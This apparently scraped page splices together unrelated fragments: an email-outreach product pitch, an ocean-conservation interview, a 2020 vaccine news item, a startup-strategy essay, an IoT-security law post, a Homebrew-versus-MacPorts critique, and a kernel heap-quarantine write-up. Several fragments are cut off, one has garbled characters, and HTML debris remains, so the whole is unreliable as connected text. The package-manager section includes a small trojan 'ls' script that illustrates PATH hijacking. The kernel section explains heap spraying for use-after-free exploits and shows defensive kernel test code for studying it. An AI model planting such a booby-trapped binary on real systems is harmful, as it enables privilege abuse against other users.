<p>Some emails would work and you would a get response. Others you would hear crickets. It was an even harder task of sending follow-up emails to people who hadn’t responded. But you still had to bust a gut to write each one.</p>



<p>THEN you had to start working on the freelance gigs that you had managed to land and all the other stuff you need to do as a freelancer.</p>



<p>So it was still a LOT of work, a LOT of time and a LOT of risk to send that many emails this way.</p>



<p>Also, I wasn’t going to paying for an expensive third party email services, I wasn’t covering my monthly salary yet, so I wasn’t going to start paying for tools that I didn’t really need.</p>



<p>I ended up getting so frustrated that I decided to create a better process, using technology, strategy, and software, to send all the emails I needed not in hours… but in just a few minutes!.</p>



<p>I chose to call it “Outflash — The Get More Clients Now System”.</p>



<p>I thought if I could create something that would make it possible to help freelancers reach more customers and leads in less time, I’d be really happy.</p>



<p>After 6 months of programming and spending my weekends putting together all the information I had gathered into a reusable framework, we created <a href="https://outflash.xyz/" target="_blank" rel="noreferrer noopener">Outflash</a> for Outlook.</p>



<p>I can now use Outlook and <a href="https://outflash.xyz/" target="_blank" rel="noreferrer noopener">Outflash</a> to send more emails than ever before in a fraction of the time.</p>



<p>I then started to let other struggling freelancers use <a href="https://outflash.xyz/" target="_blank" rel="noreferrer noopener">Outflash</a>.</p>



<p>As a result of all this we were able to achieve the following:</p>



<p>Help freelancers and small businesses to use the exact process and software we use to send emails using an existing application you already, know, love and pay for. So you no longer need to rely and pay for expensive, complicated email marketing platforms. Allowing you to create a endless list of clients to grow your business.</p>



<p>After creating <a href="https://outflash.xyz/" target="_blank" rel="noreferrer noopener">Outflash</a>, I was not only able to create a single email that can be sent to multiple people all from inside Outlook, I’ve also been able to stop spending hours and hours contacting new leads. Or touching base with old customers, because I can now contact as many customers as I would like in minutes.</p>



<p>And in the end, all of this means I’m now able to help a lot more people run their small business and achieve their dream of having a huge list of customers, willing to pay for their services.</p>

        <p><span>I</span>n May of 2017, Norwegian industrialist Kjell Inge RÃ¸kke promised to give away nearly all of his $2.4 billion fortune. He started by founding REV Ocean—the name of both a conservation initiative and the custom-built ship that would carry it forward.<br></p>

<p>The 600-foot-long REV Ocean yacht, the worldâ€™s largest Research and Expedition Vessel, should be ready for operation in 2022. It sports cutting-edge scientific instrumentation, laboratories, and its own remote-operated and autonomous underwater vehicles. RÃ¸kke calls it â€œa platform for gathering knowledge,â€� and at the shipâ€™s figurative helm will be Nina Jensen.</p>
<p>Originally trained as a marine biologist, Jensen previously served as secretary general of World Wildlife Fund Norway. There she fought for fisheries reform and pushed for the nationâ€™s $1 trillion USD pension fund to divest from fossil fuels. â€œThis had global ramifications,â€� says Jensen. â€œA lot of investors worldwide look to the Fund in terms of the investment decisions that they make.â€�</p>
<p>As REV Oceanâ€™s CEO, Jensen oversees their search for solutions to climate change, overfishing, and plastic pollution. Rather than sponsoring their own in-house researchers, REV Ocean will make their resources available to scientists, innovators, and conservationists from all over the world. â€œWe need to imagine the unthinkable,â€� she says, â€œand come up with solutions that are probably much more creative than those that we're working on today.â€�</p>
<p><em>Nautilus</em> talked to Jensen about REV Oceanâ€™s work and the future of Earthâ€™s imperiled ocean.</p>
<p><strong>It seems there is a lesson to be learned from what's happened with the pandemic in respect to the environmental crisis. What do you think of that?&nbsp;</strong></p>
<p>There seems to be this tendency of wanting to undermine scientists and leading experts who are sounding the alarm on critical issues, probably because the dimensions of the potential crisis are sometimes difficult to accept. So that's sort of the first line of response—and that's the same for a virus outbreak like this, the dramatic loss of nature, and climate change.</p>
<p><strong>What is it going to take to actually get some kind of global action on climate change? Or is it a dream?</strong></p>
<p>I think most people now finally realize there is a problem. I think people just feel like the scale of the problem is so massive that how can <em>they</em> impact it? They're just expecting somebody else to fix it—but nobody else will. It's you and me, us, we have to fix this. That's the thing. And I think there has to be much stronger global transparency and accountability and accountability in terms of emissions, and an increasing use of the taxation system in terms of dealing with it.</p>
<p>As an example, I think we need to start holding investors personally accountable for the investments they're making when it comes to climate and environmental destruction. There should be a much higher degree of accountability and transparency in terms of what we are investing in and the associated impacts of those investments. Exactly how to do that, I must admit I haven't really sorted out yet—but I think that could be a critical part of the solution. And making sure that climate change and environmental destruction to a degree is recognized as a crime, like genocide or war crimes.</p>
<p><strong>A lot of institutions are taking their investments more seriously regarding the environment, and they're divesting from fossil fuels, but how would you hold investors responsible for their investments? That seems like quite a leap. Is it possible?</strong></p>
<p>I think anything is possible. And to really solve the climate change problem we need to imagine the unthinkable and come up with solutions that are probably much more creative than those we're working on today. But given that we're also moving so rapidly forward with emissions still rising, and we're nowhere near reaching the two degrees Celsius target, probably we are way beyond that already. Meaning that weâ€™ll also need to develop carbon-negative solutions to really make sure that we are taking out what we've already emitted. But yeah, I would say anything is possible, and it has to be possible, because we're way beyond traditional measures to solve this.</p>
<blockquote>Anything is possible, and it has to be possible.</blockquote>
<p><strong>There are so many different climate models out there, some more serious than others, some relegating the cause to natural cycles rather than human action. Why all the discrepancies, do you think?</strong></p>
<p>Our entire society is built around a system that is basically flawed. We're thinking that we can continue with economic growth into eternity, and that that's what will also make us happy and healthy and thrive—which is obviously not right. And it's basically a system that is catering to, in many ways, a select few who are becoming increasingly wealthy at the expense of the rest of the population and the long-term survival of humanity.</p>
<p>Completely changing the societal system that we've built our modern ways of living and doing business around is obviously really, really complex and difficult. We would need to change the way that we run and do future businesses, and a lot of people, particularly those who are the biggest climate deniers and skeptics towards this, are the ones that are facing the biggest economic consequences of those changes.&nbsp;</p>
<p>Which is why you're usually seeing the biggest amount of climate skeptics and deniers in oil-producing countries, for example, and why you're seeing that those who have spent a lot of money and resources on trying to undermine climate science are coming from the fossil fuel industries.</p>
<p><strong>What do you think the state of the ocean will be in 20 years?</strong></p>
<p>I'm an eternal optimist. We've lost more than 40 percent of life in the ocean in just the last 40 years—but if you look 20 years forward, I would hope that we've been able to reverse that situation, that we've rebuilt at least a big part of what we've destroyed, that we're seeing flourishing ecosystems all over the world, particularly linked to kelp forests, mangroves, and sea grasses that are also essential nature-based climate solutions and soaking up probably 40 to 50 times more CO2 than land-based forests while replenishing depleted fish stocks. We would also keep plastics out of the ocean and not use the ocean as a massive waste dump.</p>
<p><strong>What do you think is the worst-case scenario if governments and people don't do something?</strong></p>
<p>That the ocean continues to become more acidic, warmer, and less productive. That additional fish stocks will be on the verge of total collapse, meaning that we will be able to harvest even less food from the ocean—which will also be a massive problem in a future where climate change will have a dramatic impact on land-based food production. And that we'll see complete shifts in ecosystem functioning around the world, with new species taking over. Just a completely different ocean from what we know today, basically.</p>
<p>Based on what the science is telling us, we will also have a dramatic increase in oxygen-depleted areas, which will mean less-productive seas and also an additional decline in key species. And, of course, the loss of entire coral reef systems that have been around for thousands of years and that are some of the most magnificent things on this planet that we've managed to destroy in pretty much one generation.</p>

</span><br><span>Espen Gjelsten / Fuglefjellet</span></figcaption></figure>
<p><strong>What do you think will be the most important contribution that the REV Ocean ship and all of your efforts can make?</strong><br></p>
<p>I hope and think that it will be to take us into concrete action. I mean, there's so much talk about environment, about climate change, but not enough practical action. We know already enough to get moving—but what we're not doing well enough is to collaborate, share data, experiences, solutions, and work together to improve the situation. So I really hope that the REV Ocean vessel can be a convening platform that brings together a wide variety of stakeholders, backgrounds, geographies and people to really get moving and fast track the solutions. And that we're also able to pair the solutions with funding and investors, so that it can be replicated and scaled worldwide.</p>
<p><strong>You come from a family of very strong women. Can you tell me a little about your great-grandmother?</strong></p>
<p>You've done your research so well. She was the first female factory inspector in Norway. And she was definitely a person who would challenge the status quo and the society's norms when it came to women. She was also fighting for women's rights all along. She challenged the concept that women had to wear skirts, that they couldn't sit with their feet across on a bicycle—things that seem absolutely ridiculous to us in this day and age. And of course she also promoted education and for women to actually take a degree and have voting rights.</p>
<p>She was an inspiration for all of us coming after her. She also left a legacy of commitment and a bit of pressure in terms of really making a difference in the world, because she certainly did in her time. And to be honest, I think if she was alive today, her mission would be the environment because there is no bigger issue that society is facing today than the environmental destruction that we're seeing all over the world.</p>
<p><strong>Do you think women have a different perspective on science?</strong></p>
<p>Not that I've picked up on. I think the biggest problem is that we haven't been able to recruit enough women into the science fields. And certainly had a society that has been shaped in a way that has made it more difficult for women to engage in various scientific fields. Thankfully that has largely changed and will continue to change. And I'm a firm believer of diversity in its full capacity, whether it's gender, age, geography, or background, if we are to solve the big scientific mysteries and societal challenges.</p>
<p><strong>One last question: What was your most inspiring ocean experience?</strong></p>
<p>Swimming in an Arctic fjord side-by-side with an eight-meter-long male Orca. …</p></article></div>

                <p><strong>LONDON –</strong> Britain today became the first Western country to approve a Covid-19 vaccine for general use as it announced a rollout of Pfizer-BioNTech's drug from next week.&nbsp;</p>

<p>"The government has today accepted the recommendation from the independent Medicines and Healthcare products Regulatory Agency (MHRA) to approve Pfizer-BioNTech's Covid-19 vaccine for use," the Health Department said in a statement.</p>

<p>"The vaccine will be made available across the UK from next week," the statement said. Priority groups will include care home residents, health and care staff, the elderly and the clinically extremely vulnerable.</p>

<p>After months of "rigorous" clinical trials and thorough analysis of the data, the MHRA "concluded that the vaccine has met its strict standards of safety, quality and effectiveness", the statement added.</p>

<p>"To aid the success of the vaccination programme, it is vital everyone continues to play their part and abide by the necessary restrictions in their area so we can further suppress the virus and allow the NHS (National Health Service) to do its work without being overwhelmed."</p>

<p>Pfizer chairman Albert Bourla said it was a "historic moment in the fight against Covid-19".&nbsp;</p>

<p>"This authorisation is a goal we have been working toward since we first declared that science will win, and we applaud the MHRA for their ability to conduct a careful assessment and take timely action to help protect the people of the UK," he said.</p>

<p>Pfizer and BioNTech added that they expected further regulatory decisions from other countries "in the coming days and weeks".</p>

<p>The announcement came as England exited a month-long coronavirus lockdown, but most of the country remained under restrictions as a new regional system for cutting infection rates kicked in.</p>

<p>The four-week lockdown, which began last month, was imposed to stop surging rates of infection, ease pressure on health services, and to allow families to gather for Christmas.</p>

<p>Prime Minister Boris Johnson, a Covid survivor, succeeded in winning a vote on the measures in parliament late yesterday, despite significant opposition within his own Conservative ranks.</p>

<p>"All we need to do now is to hold our nerve until these vaccines are indeed in our grasp and indeed being injected into our arms," he told lawmakers before the vote.</p>

<p>Until then "we cannot afford to relax, especially during the cold months of winter", he warned. – AFP, December 2, 2020</p>

  <p><span>30 Nov 2020</span></p><p>Venture capital backed startups are all about creating hyper-growth businesses. There is nearly no valuation upper bound for what we define as a startup as long as the company is sustaining its <a href="https://www.investopedia.com/terms/h/hockey-stick-chart.asp">hockey stick growth trajectory</a>. But what happens after a startup’s existing market is slowly saturated? Startups oftentimes rely on launching new business lines as a way to tap into new markets. This is different from rolling out a new product or feature since the new initiative is often operating as a separate legal entity with different business models. Think of <a href="https://www.ubereats.com/gb">Uber Eats</a> at Uber or <a href="https://stripe.com/atlas">Stripe Atlas</a> at Stripe - startups are essentially incubating new startups within themselves. These new lines not only leverage the existing strengths of the parent company, but also actively strengthen the core product offering by developing new channels for customers to gain value from the original product.</p>

<p>I became fascinated by this topic while helping to launch new business lines at Blend. Creating a new business line gives a company the freedom to innovate rapidly in a new market while leveraging existing distribution network and technical infrastructure. With sufficient resources and deliberate execution, there really is no ceiling to what a company can achieve. But companies generally face the hard economic trade-offs on investing in new business lines due to finite resources.</p>

<p>The fundamental challenge for companies to understand is what their competitive advantage is in the new market. Then it branches out into related follow-ups: Could you leverage existing distribution channels efficiently in the new market? How to utilize the current infrastructure for running new experiments economically? What does it mean to build cohesive branding across multiple business lines with underlying connectivity? How do developers build scalable software that is compatible with the current system? By and large, companies may start off deliberating on the following themes when pursuing a new business line:</p>
<ol>
  <li><strong>Advantage</strong>: understand your unique competitive advantage in a new market</li>
  <li><strong>Cohesion</strong>: build a cohesive branding narrative across multiple business lines</li>
  <li><strong>Cross-sell</strong>: validate the opportunity to sell a new offering to your existing customer base</li>
  <li><strong>Experiment</strong>: prove the business hypothesis quickly and cheaply</li>
  <li><strong>Evolution</strong>: build your system as an evolving organism</li>
</ol>

<p>There really is no one-size-fits-all formula for how to launch a new business line successfully. Even at Blend when two separate business lines are sharing the same overarching objective of making the home-buying process simpler for consumers, we had to reconstruct a new empirical model for each new business. I have seen few cases where we can simply “copy-and-paste” what is working in business line A to business line B without contextual changes. While it is useful to follow a guiding framework for the approaches and strategies, it is unavoidable to keep the execution details loose when dealing with growing business complexity.</p>

<p>There are an abundance of frameworks to cherry pick from, most with detailed explanations available on the Internet: <a href="https://www.mindtools.com/pages/article/build-measure-learn.htm">establish a closed feedback loop</a>, <a href="https://dashhudson.medium.com/pinterest-metrics-how-to-measure-and-what-to-do-with-them-274b7c4d3f4e">measure meaningful key metrics</a>, <a href="https://www.forbes.com/sites/sunniegiles/2018/04/30/how-to-fail-faster-and-why-you-should/?sh=1e73d18ac177">move quickly and fail fast</a>, <a href="https://www.ycombinator.com/library/6g-how-to-talk-to-users">talk to customers</a>, <a href="https://www.ycombinator.com/library/6f-how-to-plan-an-mvp">build an MVP</a>, and so on. If the new business hypothesis were proven by actual demand, the startup would then focus on scaling the new business mostly as an independent entity, transitioning into a multi-business line company. For internet businesses, it’s worth highlighting the importance of recognizing software systems as an evolving organism. An unusable piece of software is literally useless, regardless how great it is in design. Companies should always evolve their software systems to fit the business needs. It is nearly impossible to design a perfect system architecture at the outset mostly due to the fast changing nature of the business - always build incrementally. The business experiment might begin as a module in the monolith, then migrate out as a single service, and eventually extend and scale up as business-specific multi-services.</p>

<p>Launching a new business line generally has a higher chance of success, compared to launching a startup, because new startups have small runways and usually fewer competitive advantages. Those new lines of businesses are accelerating off the premade rails from the existing business and can spur new directions of growth for the parent company. If a company is capable of sustaining hyper-growth with emerging business lines, I don’t see why innovation would stop even as a company turns “corporate”, as innovation should always be the key driver for startups to create a better society.</p>

    <div>
      
            
      <p>Our mission to secure the world’s connected devices got a timely boost when the US Senate passed the <a href="https://www.congress.gov/116/bills/hr1668/BILLS-116hr1668eh.pdf" target="_blank">Internet of Things (“IoT”) Cybersecurity Improvement Act (H.R. 1668)</a> into law. This is the brainchild of Congresswoman Robin Kelly from Illinois.
The legislation provides for the establishment of a minimum set of cybersecurity standards for government purchased, internet connected devices.</p>
<p>The National Institute of Standards and Technology (NIST) has been directed through the legislation to provide standards and guidelines for the  federal government agencies to comply with in order to better  manage the security of their IOT devices. These standards and guidelines are designed to provide a high level of continuity and more progress on the work already done by these agencies to address considerations around vulnerability detection, identity management, patching and the configuration of their IOT devices. </p>
<p><em>Don’t comply, Fed won’t buy</em></p>
<p>There is also a procurement dimension to the legislation and the law will require federal purchasers to apply restrictions on the purchase of devices from vendors who do not meet the NIST standards and guidelines. There are waivers in certain instances such as national security or research purposes, but the general rule will apply greater discipline to the treatment of security in product design and sale. This is obviously going to have a very big impact on manufacturers in the private sector who will need to meet these requirements to sell into federal government departments. There is likely to be an overspill effect into broader industrial and consumer electronics markets as the government starts to stand up and take IoT device security at all levels very seriously.</p>
<p><em>Get out of the kitchen if you can’t take the heat</em></p>
<p>It’s timely that in a <a href="https://mender.io/blog/good-news-the-u-s-house-passes-the-iot-cybersecurity-bill" target="_blank">recent blog post</a> our CEO Thomas Ryd noted that with these new IOT cybersecurity regulations being introduced, vendors who have not placed security at the center of their product development strategies will have to take a serious look at what they are doing, if they want to stay relevant and competitive in the market. </p>
<p>The <strong>Triangle of Trust</strong> is the strategic framework that guides product strategy and development at Northern.tech and Mender. We educate our customers to put this principle at the centre of their connected device management strategy. </p>
<p>Only <strong> authorised people</strong> can deploy <strong>authorised software</strong> to <strong>authorised devices</strong>. </p>
<p>Which leads to</p>
<p>Only the <strong> right people</strong> deploying the <strong>right software</strong> to the <strong>right devices</strong>.</p>
<p><em>Security in action in our IOT</em></p>
<p>We have developed the security features and strategic partnerships to translate this principle into operational reality for our customers. This puts us at the forefront of the market. For example, we work with NXP to support hardware encryption on their iMx gateway processors. This means that a device is highly secure from tampering with and malicious take over attempts. We also support Mutual TLS handshakes and PKP certificates and align to enterprise security standards and policies. We also consider less complex gateway devices and support elliptic curve cryptography for resource-efficient security and protection. </p>
<p>We thank Congresswoman Kelly for progressing and enacting this important legislation with fellow legislators in the US Senate. We believe that we are a provider that has prepared for this day, and have anticipated the requirements knowing that it was in the best interests of the customers we serve to make sure their devices avoid malicious attacks. </p>

<section>
	<p>A couple of months ago, I uninstalled <a href="https://brew.sh/">Homebrew</a> and migrated my configuration to <a href="https://www.macports.org/">MacPorts</a>. I’ve been doing a lot of thinking about the state of package management on macOS, and here’s what I’ve come up with based on my experiences using both and interacting with their development communities.</p>

<h2 id="a-brief-history-of-package-managers-on-macos">A brief history of package managers on macOS</h2>

<p>Package management on macOS has a somewhat complex history, mostly owing to the fact that unlike most Linux distributions, macOS does not ship with a default package manager out of the box. It’s not surprising that one of the first projects to solve the problem of package management, <a href="http://www.finkproject.org/">Fink</a>, was created very early, with its initial releases predating that of Mac OS X 10.0 by several months. Using Debian’s dpkg and APT as its backend, Fink is still actively maintained, though I haven’t looked at it very closely.</p>

<p>MacPorts, on the other hand, was released in 2002 as part of <a href="https://en.wikipedia.org/wiki/Darwin_(operating_system)#OpenDarwin">OpenDarwin</a>, while Homebrew was released seven years later as a “solution” to many of the shortcomings that the author saw in MacPorts. In case it isn’t obvious from the introduction, it’s these two that we’ll be talking about. Sorry, Fink :(</p>

<h2 id="architecture">Architecture</h2>

<p>While both MacPorts and Homebrew try to solve the same problem, they really are designed quite differently from each other. These differences become immediately evident once you start using them: I personally feel that MacPorts is clearly the better architected, more mature package manager of the two.</p>

<h3 id="to-sudo-or-not-to-sudo">To <code>sudo</code> or not to <code>sudo</code></h3>

<p>Homebrew makes several questionable design decisions, but one of these deserves its own section: the choice to <a href="https://github.com/Homebrew/brew/blob/21bb9f6f5b535c35e1c3e5c1e2327c46d5756e80/docs/FAQ.md#why-does-homebrew-say-sudo-is-bad">explicitly eschew root</a> (in fact, it will refuse to work at all if run this way). This fundamentally is a <em>very bad idea</em>: package managers that install software for all users of your computer, as Homebrew does by default, should <em>always</em> require elevated privileges to function correctly. This decision has important consequences for both security and usability, especially with the advent of System Integrity Protection in OS X El Capitan.</p>

<p>For quite a while, Homebrew essentially considered itself the owner of <code>/usr/local</code> (both metaphorically and literally, as it would change the permissions of the directory), to the point where it would do things like plop its README down directly into this folder. After rootless was introduced, it moved most of its files to subdirectories; however, to maintain the charade of “sudo-less” installation, Homebrew will still trash the permissions of folders inside <code>/usr/local</code>. Homebrew’s <a href="https://github.com/Homebrew/brew/blob/2be7999878702554f1e1b5f4118978e670e6156c/docs/Troubleshooting.md#check-for-common-issues">troubleshooting guide</a> lists these out, because reinstalling macOS sets the permissions back to what they’re supposed to be and breaks Homebrew in the process:</p>

<blockquote>
  <p>If commands fail with permissions errors, check the permissions of <code>/usr/local</code>’s subdirectories. If you’re unsure what to do, you can run <code>cd /usr/local &amp;&amp; sudo chown -R $(whoami) bin etc include lib sbin share var opt Cellar Caskroom Frameworks</code>.</p>
</blockquote>

<p>Telling users to use <code>sudo</code> as a hammer to smash permissions “issues” that arise as a result of the system trying to fix damage caused by supposedly “sudo-less” software is quite ironic (and this is a bad practice in and of itself: it’s teaching users to fix problems by blindly running <code>sudo chown -R</code>). But really, this is <em>bad, bad</em> advice. Not only does this make Homebrew completely unusable for multi-user systems, it opens up a security hole (actually, <a href="https://medium.com/0xcc/rootpipe-reborn-part-i-cve-2019-8513-timemachine-root-command-injection-47e056b3cb43">multiple</a>): with <code>/usr/local/bin</code> being shared (and the first in <code>$PATH</code>!!), it’s not hard to see how changing the permissions on this directory leads to trouble. Consider a malicious shell script running with the privileges of the current user (perhaps something <a href="https://brew.sh/#install">you found on the internet</a>?) that makes a file at <code>/usr/local/bin/ls</code>:</p>

<div><div><pre><code><span>#!/bin/bash</span>

<span>if</span> <span>[[</span> <span>$(</span><span>id</span> <span>-u</span><span>)</span> <span>-eq</span> 0 <span>]]</span><span>;</span> <span>then
	</span><span>echo </span>pwned <span># you didn't happen to run "sudo ls", did you?</span>
<span>else
	</span><span>ls</span> <span>"</span><span>$@</span><span>"</span> <span># move along, nothing to see here</span>
<span>fi</span>
</code></pre></div></div>

<p>Boom, now <code>ls</code> is booby-trapped for everyone on the system.</p>



<h3 id="the-macports-philosophy">The MacPorts philosophy</h3>

<p>MacPorts, on the other hand, swings so far in the other direction that it’s actually borderline inconvenient to use in some sense. Philosophically, MacPorts has a very different perspective of how it should work: it tries to prevent conflicts with the system as much as possible. To achieve this, it sets up a hierarchy under <code>/opt</code> (which is the annoying bit, because this directory is not on <code>$PATH</code> by default, nor is picked up by compilers without some prodding).</p>

<p>Of course, this design means that there is a single shared installation is among users, so running <code>port</code> requires elevated privileges whenever performing an operation that affects all users (which, admittedly, is most of the time). MacPorts is smart about this, though: it will shed permissions and run as the <code>macports</code> user whenever possible.</p>

<p>In line with their stated philosophy to prevent conflicts with macOS, MacPorts will set up its own tools in isolation from those provided by the system (in fact, builds run in “sandboxes” under the <code>macports</code> user, where attempts to access files outside of the build directory–which includes system tools–are intercepted and blocked). This means MacPorts needs to install some “duplicate” tools (whereas Homebrew will try to use the ones that come with your system where possible), the downside of which is that there is an one-time “up-front” cost as it installs base packages. The upside is that this approach is significantly more contained, which makes it easier to manage and more likely to continue working as macOS changes under it.</p>

<p>Finally, MacPorts just seems to have a lot of thought put into it with regards to certain aspects: for example, <a href="https://guide.macports.org/chunked/internals.registry.html">the MacPorts Registry database</a> is backed by SQLite by default, which makes easily introspectable in case something goes wrong. Another useful feature is built-in “livechecks” for most ports, which codify upstream version checks and make it easy to see when MacPorts’s package index need to be updated.</p>

<h2 id="day-to-day-usage">Day-to-day usage</h2>

<p>Architecture aside, a package manager is only useful if it’s possible to actually use it. There are a couple of subareas that I feel are important, and we’ll look at how each package manager does for each in turn.</p>

<h3 id="package-availability">Package availability</h3>

<p>Nominally, MacPorts has <a href="https://www.macports.org/ports.php?by=all">over 20,000 ports</a> ports available to install by default, while Homebrew has <a href="https://formulae.brew.sh/formula/">just shy of 5,000</a> formulae (plus a couple thousand more in homebrew/cask). Of course, the only thing this really tells us is that both of them have a <em>lot</em> of packages; both of these numbers are pretty meaningless as they contain things like versioned packages and other kinds of number-inflation. If you are looking for a popular, established package, neither will disappoint: packages like <code>gcc</code>, <code>vim</code>, and <code>wget</code> are available and up-to-date on both MacPorts and Homebrew.</p>

<p>Where availability starts to differ is with lesser-used packages: MacPorts seems to have quite a few older packages that Homebrew never picked up, while Homebrew is more likely to have newer packages. Homebrew’s are slightly more up-to-date, but I think this is likely a result of having fewer packages to manage and more support to do this job, as well as an increased proclivity to remove packages that are hard to get working on the latest version of macOS. Overall, I don’t think it’s fair to say that either package manager has an advantage here; ultimately this comes down to what you will end up needing. If you’re switching between the two, it’s almost guaranteed that there’s going to be something that’s conspicuously missing from the new package manager to annoy you ;)</p>

<h3 id="usability">Usability</h3>

<p>Homebrew aims to be simple and easy to use, and in general this is true. While I’m neutral on the use of beer-related terminology and emoji, the judicious use of color is quite helpful, as is the well-formatted output. Most common usecases are straightforward, though occasionally commands can end up doing surprising things if you use them in strange ways.</p>

<p>MacPorts, on the other hand, is by no means unusable, but it’s not as polished as Homebrew is. The lack of color, as well as somewhat more cluttered and less relevant output, makes it a bit less pleasant to work with (I have a couple of patches that I apply to get the behavior I want, but expecting most users to do this is unreasonable of course). However, overall, MacPorts handles being more complex quite well, and should be pretty serviceable for most users–especially those who have used another package manager.</p>

<p>The two package mangers differ in how they distribute packages: MacPorts almost always builds packages from source, while Homebrew has continuously gotten less and less permissive of letting you do this (opting instead for downloading pre-built binaries). From a usability perspective, binaries are a clear winner: packages install much quicker and are usable nearly immediately, and you don’t leave your computer barely usable because it’s been compiling the newest version of LLVM for the last four hours. Overall, however, this is less of a problem than it may seem at first, since most package are small and build relatively quickly, making long <code>port upgrade outdated</code> invocations quite rare.</p>

<h3 id="features">Features</h3>

<p>While both package managers have the basic functionality you’d expect from a package manager, MacPorts is generally much more full featured than Homebrew is. Part of this is probably a result of architectural disparities, one example of which being that Homebrew’s set of commands to manage the dependency tree is somewhat limited. While this is unfortunate, having these limitations is somewhat reasonable given the underlying design, which would make implementing these features difficult.</p>

<p>Less justifiable is Homebrew’s habit of missing useful but slightly less-commonly used functionality (some of which have been mentioned above), and in extreme cases <em>removing</em> features entirely, or crippling them so that they are significantly less usable. Into this dubious category goes useful functionality like the ability to find and …</p></section></article></div></div>

    <p>It's 2020. Quarantines are everywhere – and here I'm writing about one, too.
But this quarantine is of a different kind.</p>

<p>In this article I'll describe the <strong>Linux Kernel Heap Quarantine</strong> that I developed
for mitigating kernel use-after-free exploitation. I will also summarize
the discussion about the prototype of this security feature on the Linux Kernel
Mailing List (LKML).</p>



<p>Use-after-free (UAF) vulnerabilities in the Linux kernel are very popular for
exploitation. There are many exploit examples, some of them include:</p>
<ul>
  <li><a href="https://seclists.org/oss-sec/2016/q4/607">CVE-2016-8655</a></li>
  <li><a href="https://www.openwall.com/lists/oss-security/2017/02/26/2">CVE-2017-6074</a></li>
  <li><a href="https://a13xp0p0v.github.io/2017/03/24/CVE-2017-2636.html">CVE-2017-2636</a></li>
  <li><a href="https://ssd-disclosure.com/ssd-advisory-linux-kernel-af_packet-use-after-free/">CVE-2017-15649</a></li>
  <li><a href="https://a13xp0p0v.github.io/2020/02/15/CVE-2019-18683.html">CVE-2019-18683</a></li>
</ul>

<p>UAF exploits usually involve <strong>heap spraying</strong>.
Generally speaking, this technique aims to put attacker-controlled bytes at a defined memory
location on the heap. Heap spraying for exploiting UAF in the
Linux kernel relies on the fact that when <code>kmalloc()</code> is called, the slab
allocator returns the address of memory that was recently freed:</p>

<p>So allocating a kernel object with the same size and attacker-controlled
contents allows overwriting the vulnerable freed object:</p>

<center><a href="https://a13xp0p0v.github.io/img/uaf.png"><img src="https://a13xp0p0v.github.io/img/uaf.png" width="70%"></a></center>


<p>Note: Heap spraying for out-of-bounds exploitation is a separate technique.</p>



<p>In July 2020, I got an idea of how to break this heap spraying technique for UAF
exploitation. In August I found some time to try it out. I extracted the slab
freelist quarantine from <a href="https://www.kernel.org/doc/html/latest/dev-tools/kasan.html">KASAN</a> functionality and called it <code>SLAB_QUARANTINE</code>.</p>

<p>If this feature is enabled, freed allocations are stored in the quarantine
queue, where they wait to be actually freed. So there should be no way for them
to be instantly reallocated and overwritten by UAF exploits.
In other words, with <code>SLAB_QUARANTINE</code>, the kernel allocator behaves like so:</p>

<p>On August 13, <a href="https://www.openwall.com/lists/kernel-hardening/2020/08/13/7">I sent</a> the first early PoC to LKML and started deeper research of
its security properties.</p>



<p>For researching the security properties of the kernel heap quarantine, I developed
two <code>lkdtm</code> tests (<a href="https://www.openwall.com/lists/kernel-hardening/2020/09/29/7">code is available here</a>).</p>

<p>The first test is called <code>lkdtm_HEAP_SPRAY</code>. It allocates and frees an object
from a separate <code>kmem_cache</code> and then allocates 400,000 similar objects.
In other words, this test attempts an original heap spraying technique for UAF
exploitation:</p>

        <span>...</span>
        <span>if</span> <span>(</span><span>spray_addrs</span><span>[</span><span>i</span><span>]</span> <span>==</span> <span>addr</span><span>)</span> <span>{</span>
            <span>pr_info</span><span>(</span><span>"FAIL: attempt %lu: freed object is reallocated</span><span>\n</span><span>"</span><span>,</span> <span>i</span><span>);</span>
            <span>break</span><span>;</span>
        <span>}</span>
    <span>}</span>
    
    <span>if</span> <span>(</span><span>i</span> <span>==</span> <span>SPRAY_LENGTH</span><span>)</span>
        <span>pr_info</span><span>(</span><span>"OK: original heap spraying hasn't succeeded</span><span>\n</span><span>"</span><span>);</span>
</code></pre></div></div>

<p>If <code>CONFIG_SLAB_QUARANTINE</code> is disabled, the freed object is instantly
reallocated and overwritten:</p>

<div><div><pre><code>  # echo HEAP_SPRAY &gt; /sys/kernel/debug/provoke-crash/DIRECT
   lkdtm: Performing direct entry HEAP_SPRAY
   lkdtm: Allocated and freed spray_cache object 000000002b5b3ad4 of size 333
   lkdtm: Original heap spraying: allocate 400000 objects of size 333...
   lkdtm: FAIL: attempt 0: freed object is reallocated
</code></pre></div></div>

<p>If <code>CONFIG_SLAB_QUARANTINE</code> is enabled, 400,000 new allocations don't overwrite
the freed object:</p>

<div><div><pre><code>  # echo HEAP_SPRAY &gt; /sys/kernel/debug/provoke-crash/DIRECT
   lkdtm: Performing direct entry HEAP_SPRAY
   lkdtm: Allocated and freed spray_cache object 000000009909e777 of size 333
   lkdtm: Original heap spraying: allocate 400000 objects of size 333...
   lkdtm: OK: original heap spraying hasn't succeeded
</code></pre></div></div>

<p>That happens because pushing an object through the quarantine requires <strong>both
allocating and freeing memory</strong>. Objects are released from the quarantine as
new memory is allocated, but only when the quarantine size is over the limit.
And the quarantine size grows when more memory is freed up.</p>

<p>That's why I created the second test, called <code>lkdtm_PUSH_THROUGH_QUARANTINE</code>.
It allocates and frees an object from a separate <code>kmem_cache</code> and then performs
<code>kmem_cache_alloc()+kmem_cache_free()</code> for that cache 400,000 times.</p>

<div><div><pre><code>    <span>addr</span> <span>=</span> <span>kmem_cache_alloc</span><span>(</span><span>spray_cache</span><span>,</span> <span>GFP_KERNEL</span><span>);</span>

        <span>if</span> <span>(</span><span>push_addr</span> <span>==</span> <span>addr</span><span>)</span> <span>{</span>
            <span>pr_info</span><span>(</span><span>"Target object is reallocated at attempt %lu</span><span>\n</span><span>"</span><span>,</span> <span>i</span><span>);</span>

    <span>}</span>
</code></pre></div></div>

<p>This test effectively pushes the object through the heap quarantine and
reallocates it after it returns back to the allocator freelist:</p>

</code></pre></div></div>

<p>As you can see, the number of the allocations needed for overwriting
the vulnerable object is almost the same. That would be good for stable
UAF exploitation and should not be allowed.
That's why I developed <a href="https://www.openwall.com/lists/kernel-hardening/2020/09/29/6"><strong>quarantine randomization</strong></a>. This randomization
required very small hackish changes to the heap quarantine mechanism.</p>

<p>The heap quarantine stores objects in batches. On startup, all
quarantine batches are filled by objects. When the quarantine shrinks,
I randomly choose and free half of objects from a randomly chosen batch.
